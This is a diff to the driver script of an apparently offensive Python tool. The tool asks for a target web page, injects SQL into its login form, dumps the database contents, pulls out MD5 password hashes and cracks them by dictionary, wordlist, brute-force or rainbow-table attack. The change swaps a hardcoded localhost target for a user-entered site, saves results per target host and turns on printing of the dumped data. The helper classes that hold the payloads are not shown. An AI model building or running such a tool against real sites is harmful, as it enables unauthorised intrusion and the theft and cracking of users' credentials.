@@ -15,8 +15,6 @@ import pathlib
 import json
 import time
 
-MAXPASSWORDSIZE = 25 # SET LIMIT PASSWORD
-
 def smart_path(dir = ''):
     all_path = str(pathlib.Path(__file__).parent.absolute()).lower()
     dir_path = str(pathlib.Path().absolute()).lower()
@@ -26,28 +24,27 @@ def smart_path(dir = ''):
         path = path+'/'
     return path+dir
 
-# r = console({
-#     'ask': [
-#         [
-#             'Please write the web page with an input? ',
-#             'Please choose Attack type [1 - Dictionary | 2 - WordList | 3 - Bruteforce | 4 - RainbowTable]? '
-#         ],
-#         [
-#             ['\n*** Incorrect website! ***', url],
-#             ['\n*** Invalid option ***', opc]
-#         ]
-#     ]
-# }).log()
+r = console({
+    'ask': [
+        [
+            'Please write the web page with an input? ',
+            '1 - Dictionary \n2 - WordList \n3 - Bruteforce \n4 - RainbowTable \nPlease choose Attack type? '
+        ],
+        [
+            ['\n*** Incorrect website! ***', url],
+            ['\n*** Invalid option ***', opc]
+        ]
+    ]
+}).log()
 
-r = ['http://localhost/login.php', '4']
+app = App()
 
 #DEFINE ALL PROPERTY
 hw = hack_WEB({
     'app_token' : '<hack-info>',
     'url_website' : r[0],
-    'len_password' : MAXPASSWORDSIZE,
-    'dir_root' : smart_path(),
-    'dir_hashes' : smart_path('src/data/hashes.json'),
+    'dir_root' : smart_path(''),
+    'dir_hostHash' : smart_path('src/data/hashes/')+app.hostname(r[0])+'.json',
     'dir_bruteforce' : smart_path('src/data/bruteforce.json'),
     'dir_wordlist' : smart_path('src/data/wordlist.json'),
     'dir_rainbowtable' : smart_path('src/data/rainbowtable.json'),
@@ -61,19 +58,18 @@ obj = hw.HTMLformOBJ()
 obj = hw.injectSQL(obj)
 
 if len(obj) > 0:
-    #print( "\nWe found: " + str(obj) )
+    print( "\nWe found: " + str(obj) )
     hs = hack_SQL(obj)
     obj = hs.findAllData()
     
     if len(obj) > 0:
-        #print( "\nWe found: " + str(obj) )
+        print( "\nWe found: " + str(obj) )
 
         do = decrypt({'sql':obj, 'obj':hs.OBJ})
         HASHES = do.getMD5()
 
         print('\n>>> Decrypting..')
         obj = hs.OBJ
-        app = App()
         DICLIST = app.getJSON(obj['dir_dictionary'])
         WRDLIST = app.getJSON(obj['dir_wordlist'])
         CHRLIST = app.getJSON(obj['dir_bruteforce'])
@@ -106,11 +102,11 @@ if len(obj) > 0:
                 HASHES
             )
         FinishTime = time.perf_counter()
-        thisHashes = app.getJSON(obj['dir_hashes'])['localhost']
-        newhashes = f'{str(pathlib.Path().absolute())}/'+smart_path(thisHashes)
+        hostHash = obj['dir_hostHash']
+        newhashes = f'{str(pathlib.Path().absolute())}/'+smart_path(hostHash)
 
         #RESUME
-        print(f'[+] File: {newhashes}\n')
-        print (json.dumps(app.getJSON(newhashes), sort_keys=True, indent=2))
-        print(f'\n\n[+] Threads: {do.numThread}\n[+] Try: {do.numTry}\n[+] Found: {do.numFound}')
-        print(f'[+] Finished in {round(FinishTime-StartTime, 2)} second(s)')
+        print(f'\n[+] File: {newhashes}')
+        print(json.dumps(app.getJSON(newhashes), sort_keys=True, indent=4))
+        print(f'\n[+] Threads: {do.numThread}\n[+] Try: {do.numTry}\n[+] Found: {do.numFound}')
+        print(f'[+] Finished in {round(FinishTime-StartTime, 3)} second(s)')
